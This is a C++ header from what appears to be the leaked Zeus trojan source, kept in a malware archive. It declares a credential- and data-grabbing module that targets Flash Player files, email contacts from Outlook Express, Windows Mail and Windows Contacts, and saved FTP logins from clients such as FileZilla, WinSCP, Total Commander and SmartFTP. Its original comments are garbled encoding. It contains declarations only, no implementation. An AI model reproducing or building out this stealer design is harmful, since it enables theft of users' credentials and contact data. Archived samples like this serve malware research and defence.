/*
  name      Zeus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
#pragma once
/*
  ������� �������/������� � �.�. �� ���������� ��.
*/
namespace SoftwareGrabber
{
  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    ��������� "�����" �� Macromedia(Adobe) Flash Player.
  */
  void _getMacromediaFlashFiles(void);

  /*
    �������� "�����" �� Macromedia(Adobe) Flash Player.
  */
  void _removeMacromediaFlashFiles(void);

#if(BO_SOFTWARE_EMAIL > 0)  
  
  /*
    ������� ����������� �� Windows Mail/Outlook Express.
  */
  void _emailWindowsMailRecipients(void);
  
  /*
    ������� ������� �� Outlook Express.
    ������� ������������ ������ � XP.
  */
  void _emailOutlookExpress(void);

  /*
    ������� ������� �� Windows Mail/Windows Live Mail.

    IN live - true - Windows Live Mail,
              false - Windows Mail.
  */
  void _emailWindowsMail(bool live);
  
  /*
    ��������� email'�� �� Windows Address Book. ��������� �������� �� ���� �����, �����, �
    ��������������� �������� ����� �������� ������������.
    ������� ������������ ������ � XP.
  */
  void _emailWindowsAddressBook(void);

  /*
    ��������� email'�� �� Windows Contacts.
  */
  void _emailWindowsContacts(void);

  /*
    ��������� ���� E-mail-��������.

    ������� ComLibrary.
  */
  void _emailAll(void);
#endif

#if(BO_SOFTWARE_FTP > 0)
  /*
    FlashFXP 3.x.x
  */
  void _ftpFlashFxp3(void);
  
  /*
    CuteFtp 8.x.x
  */
  void _ftpCuteFtp(void);
  
  /*
    Total Commander
  */
  void _ftpTotalCommander(void);
  
  /*
    WsFTP 12.
  */
  void _ftpWsFtp(void);
  
  /*
    FileZilla 3.x.x
  */
  void _ftpFileZilla(void);
  
  /*
    FAR Manager 1.x, 2.x.
  */
  void _ftpFarManager(void);
  
  /*
    WinSCP 4.2.x
  */
  void _ftpWinScp(void);
  
  /*
    FTP Commander 9.2.
  */
  void _ftpFtpCommander(void);
  
  /*
    CoreFTP 2.x.
  */
  void _ftpCoreFtp(void);
  
  /*
    SmartFTP 2, 3, 4.
  */
  void _ftpSmartFtp(void);

  /*    Handling all FTP-clients.

    Requires ComLibrary.
  */
  void _ftpAll(void);
#endif
};
